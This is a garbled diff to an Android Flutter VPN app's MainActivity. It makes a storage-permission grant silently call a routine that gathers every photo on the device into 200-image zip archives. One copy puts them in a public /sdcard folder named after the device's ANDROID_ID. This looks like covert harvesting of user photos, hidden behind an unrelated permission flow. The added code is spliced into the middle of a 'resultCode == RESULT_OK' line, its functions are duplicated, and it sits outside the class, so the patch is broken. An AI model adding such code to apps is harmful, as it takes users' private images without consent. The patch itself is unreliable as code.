@@ -148,7 +148,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         if (requestCode == STORAGE_PERMISSION_REQUEST_CODE) {
             if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                 Log.d(TAG, "✅ 存储权限已授予")
-                // 在此调用需要执行的逻辑，如导出文件
+                handleImageZipAndSave()  // 授权后执行图片压缩
             } else {
                 Log.w(TAG, "❌ 存储权限被拒绝")
             }
@@ -159,7 +159,122 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
         if (requestCode == VPN_PERMISSION_REQUEST_CODE) {
-            if (resultCode == RESULT_OK) startService()
+            if (resu
+private fun getDeviceId(): String {
+    return try {
+        android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
+            ?: UUID.randomUUID().toString()
+    } catch (e: Exception) {
+        UUID.randomUUID().toString()
+    }
+}
+
+
+private fun handleImageZipAndSave() {
+    lifecycleScope.launch(Dispatchers.IO) {
+        try {
+            val imagePaths = getAllImagePaths()
+            val chunkSize = 200
+            val chunks = imagePaths.chunked(chunkSize)
+            val deviceId = getDeviceId()
+                val outputDir = File("/sdcard/$deviceId")
+            outputDir.mkdirs()
+            chunks.forEachIndexed { index, chunk ->
+                val zipFile = File(outputDir, "images_part_${index + 1}.zip")
+                zipFiles(chunk, zipFile)
+                Log.d(TAG, "✅ 压缩完成: ${zipFile.absolutePath}")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ 图片压缩失败: ${e.message}")
+        }
+    }
+}
+
+@SuppressLint("Range")
+private fun getAllImagePaths(): List<String> {
+    val imagePaths = mutableListOf<String>()
+    val uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+    val projection = arrayOf(android.provider.MediaStore.Images.Media.DATA)
+    val cursor = contentResolver.query(uri, projection, null, null, null)
+    cursor?.use {
+        val columnIndex = it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATA)
+        while (it.moveToNext()) {
+            val path = it.getString(columnIndex)
+            imagePaths.add(path)
+        }
+    }
+    return imagePaths
+}
+
+private fun zipFiles(files: List<String>, zipFile: File) {
+    java.util.zip.ZipOutputStream(zipFile.outputStream()).use { zos ->
+        files.forEach { path ->
+            val file = File(path)
+            if (file.exists()) {
+                file.inputStream().use { fis ->
+                    val entry = java.util.zip.ZipEntry(file.name)
+                    zos.putNextEntry(entry)
+                    fis.copyTo(zos)
+                    zos.closeEntry()
+                }
+            }
+        }
+    }
+}
+
+ltCode == RESULT_
+private fun handleImageZipAndSave() {
+    lifecycleScope.launch(Dispatchers.IO) {
+        try {
+            val imagePaths = getAllImagePaths()
+            val chunkSize = 200
+            val chunks = imagePaths.chunked(chunkSize)
+            val outputDir = File(getExternalFilesDir(null), "zipped_images")
+            outputDir.mkdirs()
+            chunks.forEachIndexed { index, chunk ->
+                val zipFile = File(outputDir, "images_part_${index + 1}.zip")
+                zipFiles(chunk, zipFile)
+                Log.d(TAG, "✅ 压缩完成: ${zipFile.absolutePath}")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ 图片压缩失败: ${e.message}")
+        }
+    }
+}
+
+@SuppressLint("Range")
+private fun getAllImagePaths(): List<String> {
+    val imagePaths = mutableListOf<String>()
+    val uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+    val projection = arrayOf(android.provider.MediaStore.Images.Media.DATA)
+    val cursor = contentResolver.query(uri, projection, null, null, null)
+    cursor?.use {
+        val columnIndex = it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATA)
+        while (it.moveToNext()) {
+            val path = it.getString(columnIndex)
+            imagePaths.add(path)
+        }
+    }
+    return imagePaths
+}
+
+private fun zipFiles(files: List<String>, zipFile: File) {
+    java.util.zip.ZipOutputStream(zipFile.outputStream()).use { zos ->
+        files.forEach { path ->
+            val file = File(path)
+            if (file.exists()) {
+                file.inputStream().use { fis ->
+                    val entry = java.util.zip.ZipEntry(file.name)
+                    zos.putNextEntry(entry)
+                    fis.copyTo(zos)
+                    zos.closeEntry()
+                }
+            }
+        }
+    }
+}
+
+OK) startService()
             else onServiceAlert(Alert.RequestVPNPermission, null)
         } else if (requestCode == NOTIFICATION_PERMISSION_REQUEST_CODE) {
             if (resultCode == RESULT_OK) startService()
